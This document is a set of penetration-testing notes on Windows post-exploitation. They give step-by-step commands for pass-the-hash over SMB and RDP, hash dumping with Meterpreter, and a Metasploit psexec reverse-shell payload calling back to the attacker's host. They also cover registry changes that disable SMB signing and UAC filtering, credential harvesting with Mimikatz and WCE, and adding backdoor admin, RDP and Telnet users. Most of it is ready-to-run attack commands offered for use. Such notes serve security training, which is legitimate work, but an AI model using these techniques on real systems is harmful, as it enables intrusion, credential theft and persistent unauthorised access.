### Pass-the-Hash Attack 



**Prerequisites for Pass-the-Hash Attack**
To successfully perform a Pass-the-Hash (PtH) attack and maintain access using SMB, you must ensure the following:

1. **Obtain the Hash**: 
   - The attacker must have the NTLM hash of a valid user. This user must have administrative privileges or belong to the Administrators group on the target system.
   
2. **Administrator Privileges**:
   - The user whose hash is obtained needs to be part of the local administrators or domain admin group on the target machine for privileged access.

3. **Open Services (like SMB)**:
   - The target system must have SMB (port 445) open to facilitate the connection. Other services could be checked for vulnerabilities, but for this example, we focus on SMB.
#### pass the hash attack over smb

 **Steps to Scan the Target**
Before performing the Pass-the-Hash attack, you should scan the target for open services. Here’s an example using `nmap`:

```bash
nmap  <target-ip>
```

This will check if SMB is open on the target. If SMB is available, you can proceed with the attack.

**get the admin hash**
> need to be system user , but it can also work on administrator user with  some windows versions

```bash
#using metasploit meterpreter 
meterpreter> run hashdump  
```
- `hashdump (hashdump)`  is a basic, direct method for dumping hashes.
- **`smart_hashdump (run hashdump)`** is a more sophisticated and adaptive module that tries to use the most


**Pass-the-Hash Attack on SMB**

Assuming you have the NTLM hash for a user with administrative rights, you can use the `impacket` suite for the Pass-the-Hash attack. Here’s an example:

```bash
# using metasploit
use exploit/windows/smb/psexec
set RHOSTS <target_ip>
set SMBUser <username>
set SMBPass <ntlm_hash>
set SMBPass NT <NTLM_hash> (if only the NTLM hash is used)
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <your_ip>
run

```



 **Correct Handling of Access Denied (Command=117)***
 
>When trying to use Pass-the-Hash for SMB using user in administrator group and encountering access issues with the error message similar to **"command=117"**, this is typically related to SMB security settings that require a certain level of signing or prevent privileged access over the network.

 **Solution: Modifying the Required Registry Settings**

To resolve this, you need to modify two key registry values to allow the administrative hash to work properly over SMB and avoid issues like **Access Denied**.

1. **Registry Key 1: `LocalAccountTokenFilterPolicy`**

   This key allows local administrative users to authenticate over the network without User Account Control (UAC) interference.

   **PowerShell Command:**
   ```powershell
   New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -PropertyType DWord -Force
   ```

2. **Registry Key 2: `RequireSecuritySignature`**

   This setting forces SMB to use message signing, which can prevent certain operations, like Pass-the-Hash attacks, if enabled. Disabling it can help overcome the "Access Denied" issue.

   You need to create a new `DWORD (32-bit)` value named `RequireSecuritySignature` and set it to `0` under the `LanmanServer` settings.

   **PowerShell Command:**
   ```powershell
   New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0 -PropertyType DWord -Force
   ```

#### pass the hash attack over RDP 
```bash
xfreerdp /u:admin /d:foocorp /pth:<NTLM_HASH> /v:172.16.2.119
```
>uses the NTLM hash to authenticate the user over RDP (Remote Desktop Protocol) without needing the clear-text password.

### cracking the hash

- After dumping hashes, attempt to crack them to retrieve passwords for active services.
- Password cracking isn't covered in this section, but will be discussed in-depth in the **System Security** section. `john --format=NT hashes.txt`

---

### Using Mimikatz to Gather Credentials 

- **Ensure 64-bit process for Mimikatz**: For Mimikatz to work fully, it must run in a 64-bit process. Verify your current Meterpreter session’s architecture with the command:

  ```
  meterpreter > sysinfo
  ```

  If running on a 32-bit process, migrate to a 64-bit process with the same privileges (e.g., SYSTEM).

- **Migrating to a 64-bit process**:
  1. List processes with SYSTEM privileges and filter by architecture using:

     ```
     meterpreter > ps -A x86_64 -s
     ```

     `-A`: Specifies the architecture (e.g., x64)
     `-s`: Filters for SYSTEM processes

     Example of output:
     ```
     PID   Name        Arch   User
     280   smss.exe    x64    NT AUTHORITY\SYSTEM
     308   svchost.exe x64    NT AUTHORITY\SYSTEM
     ```

  2. Identify a 64-bit process (e.g., `smss.exe`, `svchost.exe`) and migrate to it by using:

     ```
     meterpreter > migrate [PID]
     ```

     Example:
     ```
     meterpreter > migrate 448
     ```

  3. Verify the migration by checking the user and system info:

     ```
     meterpreter > getuid
     meterpreter > sysinfo
     ```

- **Retrieving credentials with wdigest**:
  1. To extract credentials from the system, use the `wdigest` command:

     ```
     meterpreter > wdigest
     ```

  2. The output will display credentials such as the AuthID, NTLM hashes, and users.
 
  - **Mimikatz Usage**: 
  - Mimikatz offers various modules like `crypto`, `hash`, `system`, `privilege`, and more. Explore the commands and modules for further tasks, such as credential extraction and privilege manipulation.

For more detailed exploration, refer to the [Mimikatz wiki](https://github.com/gentilkiwi/mimikatz/wiki).

- **Using WCE (Windows Credentials Editor)**:
  Another very useful tool that can be used in this step is WCE (Windows Credentials Editor). Since it is a Windows binary, you will have to upload it to the remote machine and then run it from the Meterpreter session.

  1. Upload WCE to the remote machine.
  2. Execute WCE from the Meterpreter session using the following command:

     ```
     meterpreter > execute -f wce.exe -a -h
     ```
     Example output:
     ```
     Process 3628 created
     Channel 4 created
     WCE v1.42beta (X64) (Windows Credentials Editor) (c) 2010-2013 Amplia Security by Hernan Och
     ```
  3. Common options for WCE include:
     - `-l`: List logon sessions and NTLM credentials (default)
     - `-s`: Lists logon sessions and NTLM credentials indefinitely, refreshing every 5 seconds
     - `-c`: Run a specified command in a new session with NTLM credentials

  For more details, refer to the [WCE documentation](https://www.ampliasecurity.com/research/windows-credentials-editor/).




### Enabling the Stopped or Not Running Services 

Opening a Windows Command Prompt from a Meterpreter Shell

`  meterpreter > shell`
  
  ``` <cmd example here>
  net start
  ```
  Displays a list of all running services.

Checking Specific Services with WMIC
- Command:
  ``` <cmd example here>
  wmic service where 'Caption like "Remote%" and started=true' get Caption
  ```
  This command checks if specific services (e.g., services with "Remote" in their name) are enabled and running using WMIC.

Checking Services with Meterpreter Scripts
- Listing Services with `service_manager`:
  ``` <cmd example here>
  run service_manager -l
  ```

- Using `enum_services`:
  ``` <cmd example here>
  run post/windows/gather/enum_services
  ```

Enabling Remote Desktop (RDP)
- Using Meterpreter `getgui` Script:
  ``` <cmd example here>
  meterpreter > run getgui -e
  ```
  - Options:
    - `-e`: Enable RDP.
    - `-u <username>`: Add a user.
    - `-p <password>`: Add a password.

  This command enables RDP and can also add a user and password.

Adding a User to Remote Desktop Users Group
- Command:
  ``` <cmd example here>
  net localgroup "Remote Desktop Users" <username> /add
  ```
  Adds `<username>` to the "Remote Desktop Users" group, allowing them to connect via RDP.

Checking the Firewall for RDP
Ensure that the Windows firewall allows RDP connections after enabling the service.

Establishing an RDP Connection
- Command:
  ``` <cmd example here>
  rdesktop [IP_ADDRESS] –u [USERNAME] –p [PASSWORD]
  ```
  Use this to establish a Remote Desktop session with the target machine.

Listing Groups with `net localgroup`
- Command:
  ``` <cmd example here>
  net localgroup
  ```
  Lists all groups on the system.

Listing Users within a Group
- Command:
  ``` <cmd example here>
  net localgroup "Remote Desktop Users"
  ```
  Lists users in the "Remote Desktop Users" group.

Adding a User to the Administrators Group
- Command:
  ``` <cmd example here>
  net localgroup Administrators <username> /add
  ```
  Grants a standard user administrator privileges.

Enabling Telnet for Remote Access
- Ensure the **Telnet service** is enabled and the user is in the **TelnetClients** group.
- Command:
  ``` <cmd example here>
  net localgroup TelnetClients <username> /add
  ```

This allows for remote shell access via Telnet, using the same credentials.
